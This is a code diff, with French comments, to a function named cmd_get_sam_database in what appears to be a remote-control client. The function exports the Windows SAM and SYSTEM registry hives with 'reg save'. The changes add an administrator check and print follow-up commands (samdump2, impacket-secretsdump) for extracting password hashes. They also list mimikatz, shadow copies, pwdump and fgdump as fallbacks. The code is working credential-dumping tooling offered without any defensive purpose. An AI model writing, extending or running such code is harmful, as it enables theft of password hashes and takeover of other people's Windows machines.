@@ -156,10 +156,32 @@ def cmd_get_sam_database():
     if not platform.system().lower().startswith("win"):
         return "(commande Windows uniquement)"
     
+    results = []
+    
+    # Vérifier si on est admin
+    try:
+        import ctypes
+        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+        results.append(f"Droits administrateur: {'OUI' if is_admin else 'NON'}")
+    except:
+        results.append("Droits administrateur: INCONNU")
+    
+    if not is_admin:
+        results.append("\n⚠️ ERREUR: Droits administrateur requis pour extraire SAM")
+        results.append("\nPour obtenir SAM:")
+        results.append("1. Ouvrez PowerShell en tant qu'Administrateur")
+        results.append("2. Relancez le client")
+        results.append("\nOU utilisez ces commandes manuellement (en admin):")
+        results.append('  reg save HKLM\\SAM sam.hiv')
+        results.append('  reg save HKLM\\SYSTEM system.hiv')
+        return "\n".join(results)
+    
     try:
         # Méthode 1: Utiliser reg save (nécessite admin)
         sam_file = Path.cwd() / "sam_export.hiv"
         system_file = Path.cwd() / "system_export.hiv"
+        
+        results.append("\n📁 Tentative d'export de la base SAM...")
         
         # Essayer d'exporter SAM avec un timeout plus court
         try:
@@ -168,13 +190,20 @@ def cmd_get_sam_database():
                 shell=True, capture_output=True, text=True, timeout=5
             )
         except subprocess.TimeoutExpired:
-            return "(Timeout - La commande reg save a pris trop de temps. Vérifiez les permissions et UAC)"
+            results.append("❌ TIMEOUT - La commande reg save SAM a pris trop de temps")
+            results.append("   Cela peut arriver si UAC bloque ou si le système refuse l'accès")
+            return "\n".join(results)
         
         if result.returncode != 0:
-            # Essayer une méthode alternative via PowerShell
             error_msg = result.stderr.strip() if result.stderr else "Erreur inconnue"
-            return (f"(Accès refusé - méthode reg save)\n{error_msg}\n\n"
-                   f"Alternative: Utilisez des outils comme 'pwdump' ou 'samdump2' avec des privilèges SYSTEM")
+            results.append(f"❌ Échec de l'export SAM: {error_msg}")
+            results.append("\n💡 Méthodes alternatives:")
+            results.append("  - Utiliser 'mimikatz' pour extraire les hash en mémoire")
+            results.append("  - Créer une Volume Shadow Copy et extraire depuis celle-ci")
+            results.append("  - Utiliser 'pwdump' ou 'fgdump'")
+            return "\n".join(results)
+        
+        results.append(f"✅ SAM exporté: {sam_file}")
         
         # Essayer d'exporter SYSTEM
         try:
@@ -183,19 +212,30 @@ def cmd_get_sam_database():
                 shell=True, capture_output=True, text=True, timeout=5
             )
         except subprocess.TimeoutExpired:
-            return f"(SAM exporté mais SYSTEM timeout)\nSAM: {sam_file}"
+            results.append("⚠️ SYSTEM timeout (mais SAM OK)")
+            return "\n".join(results)
+        
+        if result2.returncode == 0:
+            results.append(f"✅ SYSTEM exporté: {system_file}")
         
         sam_size = sam_file.stat().st_size if sam_file.exists() else 0
         system_size = system_file.stat().st_size if system_file.exists() else 0
         
-        return (f"SAM database exportée:\n"
-                f"- SAM: {sam_file} ({sam_size} bytes)\n"
-                f"- SYSTEM: {system_file} ({system_size} bytes)\n"
-                f"Utilisez des outils comme samdump2 ou impacket pour extraire les hash")
+        results.append(f"\n📊 Tailles des fichiers:")
+        results.append(f"  - SAM: {sam_size:,} bytes")
+        results.append(f"  - SYSTEM: {system_size:,} bytes")
+        results.append(f"\n🔓 Pour extraire les hash de mots de passe:")
+        results.append(f"  samdump2 {system_file} {sam_file}")
+        results.append(f"  OU")
+        results.append(f"  impacket-secretsdump -sam {sam_file} -system {system_file} LOCAL")
+        
+        return "\n".join(results)
     except subprocess.TimeoutExpired:
-        return "(timeout lors de l'export SAM - vérifiez les permissions)"
+        results.append("❌ Timeout général lors de l'export SAM")
+        return "\n".join(results)
     except Exception as e:
-        return f"(erreur export SAM: {e})"
+        results.append(f"❌ Erreur: {e}")
+        return "\n".join(results)
 
 def cmd_add_registry_key(key_path: str, value_name: str, value_data: str, value_type: str = "REG_SZ"):
     """Ajoute ou modifie une clef dans le registre Windows"""
